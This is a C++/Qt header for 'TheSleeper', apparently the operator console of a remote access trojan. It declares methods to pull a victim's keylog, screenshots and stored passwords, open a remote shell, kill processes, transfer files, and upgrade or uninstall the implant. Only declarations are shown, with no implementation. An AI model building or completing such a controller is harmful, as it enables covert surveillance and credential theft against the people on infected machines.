#ifndef _THE_SLEEPER_
#define _THE_SLEEPER_

#include <QApplication>
#include <QEventLoop>
#include <QPixmap>
#include <QStringList>
#include <QStandardItemModel>
#include <QFileIconProvider>
#include <QMutex>

#include <blaspheme/transfer/FileTransfer.hpp>
#include <blaspheme/protocol/Session.hpp>
#include <string>
using std::string;

#include "GraphicProgressBar.hpp"

namespace TheSleeper
{
    extern QMutex stream_mutex;
  
    class Client : public QObject
    {
        Q_OBJECT

        public:
        
			Client(Blaspheme::Session _session, QObject * parent=0);
            void addStream(Network::TcpClient new_stream);
			Blaspheme::SessionId getUniqueId();
            QString getIp();
            QString getPort();
            QString getStatus();
            QString getName();
            QString getSystemVersion();
            const QString& getKeylog();
            QPixmap& getScreen();
            QString getRemoteSystemVersion();
			QStringList& getProcessList();
            void updateScreen(int quality, QProgressBar * bar=0);
            QStandardItemModel& getRemoteFileTree();
	        QStringList& getStoredPasswords();
			QAbstractTableModel& getTransfersTable();
            
            void updateProcessList();
            void updateKeylog(QProgressBar * bar=0);
            void killProcess(QString process);
            void disconnect();
            void remoteShell();
            void remoteShutdown();
            void remoteReboot();
            void remoteLogout();
            void remoteHibernate();
            void shutdown();
            void reboot();
            void uninstall();
            void upgrade(QString server_filename, QProgressBar * bar=0);
            
            bool browseFiles(QModelIndex current_index);
            QStandardItemModel& updateLogicalVolumes();
            QString getRemotePath(QModelIndex current_index);
            
            void startDownload(QString& source, QString& destination, QProgressBar * bar);
            void startUpload(QString& source, QString& destination, QProgressBar * bar);
            
        signals:
        
            void disconnected();
            void remoteShellState(bool);
            
        private:
            
            void updateSystemVersion();
            void updateClientName();
            void updatePasswords();
            
            Blaspheme::Session session;

            // Processus
            QStringList processes;
            
            // arbre des fichiers distants
            QStandardItemModel remote_files;
            
            // arbre des mots de passes distants
            QStringList stored_passwords;
            
            // gérateur d'icone pour les arbres de fichiers
            QString current_keylog;
            QString status;
            QString name;
            QString system_version;
            QFileIconProvider iprov;
            QPixmap screen;
    };

} /* TheSleeper */

#endif // _THE_SLEEPER_
